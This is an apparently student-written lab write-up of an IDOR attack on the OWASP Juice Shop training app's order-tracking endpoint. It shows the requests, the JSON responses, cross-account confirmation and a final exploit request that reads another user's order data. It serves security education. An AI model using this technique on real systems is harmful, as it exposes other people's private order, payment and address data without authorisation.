# F-05 — IDOR (Insecure Direct Object Reference) | Payload Progression

## Target
- Application: OWASP Juice Shop
- Module: Order Tracking
- Security Level: No Authorization Check
- Track URL: `http://localhost:3000/#/track-result?id=<orderId>`
- REST Endpoint: `http://localhost:3000/rest/track-order/<orderId>`

---

## Step 1 — Reconnaissance: Understanding the Order Tracking Mechanism

**What I tried first:**
Logged in as the victim account (`kavach2@test.com`) and placed a
standard order for **Apple Pomace (0.89¤)**. After checkout,
observed the browser address bar.

**What happened:**
The browser navigated to:
```
http://localhost:3000/#/track-result?id=1aed-954b402dd28f9528
```

**Key observations:**
1. The order ID `1aed-954b402dd28f9528` is exposed directly in the
   URL fragment — visible in browser history, shared links, and
   HTTP Referer headers.
2. The frontend passes this ID to a backend REST call:
   ```
   GET /rest/track-order/1aed-954b402dd28f9528
   ```
3. The order tracking page displayed:
   - Product: Apple Pomace × 1 @ 0.89¤
   - Expected Delivery: 1 Day
   - Bonus Points Earned: 0
4. The order ID format appears to be a UUID-like string — not
   obviously sequential, but still predictable if enumerated or
   leaked.

---

## Step 2 — Identifying the REST Endpoint and Response Structure

**What I tried:**
Opened the REST endpoint directly in a second browser tab while
still authenticated as the victim:
```
http://localhost:3000/rest/track-order/1aed-954b402dd28f9528
```

**What happened:**
The server returned a full JSON payload:
```json
{
  "status": "success",
  "data": [
    {
      "promotionalAmount": "0",
      "paymentId": "7",
      "addressId": "7",
      "orderId": "1aed-954b402dd28f9528",
      "delivered": false,
      "email": "k*v*ch2@t*st.c*m",
      "totalPrice": 1.88,
      "products": [
        {
          "quantity": 1,
          "id": 24,
          "name": "Apple Pomace",
          "price": 0.89,
          "total": 0.89,
          "bonus": 0
        }
      ],
      "bonus": 0,
      "deliveryPrice": 0.99,
      "eta": "1",
      "_id": "rXrYBPvkvNDJCGfTZ"
    }
  ]
}
```

**Key observations:**
- The server returns `paymentId` and `addressId` integer values —
  both potential targets for further IDOR attacks.
- The victim's email is present (partially masked as
  `k*v*ch2@t*st.c*m`) — still useful for targeted phishing.
- There is **no session ownership validation** — the server
  returned this data based solely on the order ID in the URL.

---

## Step 3 — Manual Confirmation of No Authorization Check

**What I tried:**
Opened a separate private browser window, logged in as the
attacker account (`user2@test.com`), and navigated to the same
order tracking URL using the victim's order ID:
```
http://localhost:3000/#/track-result?id=1aed-954b402dd28f9528
```

**What happened:**
The order tracking page loaded successfully — displaying the
victim's complete order details under the attacker's session.
The application did not:
- Return a 403 Forbidden error
- Redirect to the attacker's own orders
- Display any warning or session mismatch error

This confirms the endpoint performs **zero server-side ownership
validation**.

---

## Step 4 — Direct REST API Call from Attacker Session

**What I tried:**
While authenticated as `user2@test.com`, called the REST endpoint
directly:
```
GET http://localhost:3000/rest/track-order/1aed-954b402dd28f9528
```

**What happened:**
The server returned the identical JSON payload as seen in Step 2 —
full order data belonging to `kavach2@test.com` — delivered to the
attacker's session without any authorization error.

---
## Why the Attacked Worked 
The Application returned order information based solely on the order 
ID supplied in the request . NO ownership validation was performed between the authenticated user session and the requested order record. 
As a result, any authenticated user with knowledge of a valid order ID could access another user's order details.
---

## Final Working Payload

**Victim order ID obtained from URL:**
```
1aed-954b402dd28f9528
```

**Attacker's exploit request (browser navigation):**
```
http://localhost:3000/#/track-result?id=1aed-954b402dd28f9528
```

**Attacker's exploit request (direct REST call):**
```
GET http://localhost:3000/rest/track-order/1aed-954b402dd28f9528
Authorization: Bearer <user2@test.com JWT>
```

- **Effect:** Full order details of `kavach2@test.com` returned to
  `user2@test.com` — unauthorized horizontal privilege escalation
- **Vulnerability:** No server-side ownership check on order ID
- **OWASP Category:** A01:2021 — Broken Access Control
- **CWE:** CWE-639 — Authorization Through User-Controlled Key
- **Security Level tested:** Default juice shop configuration
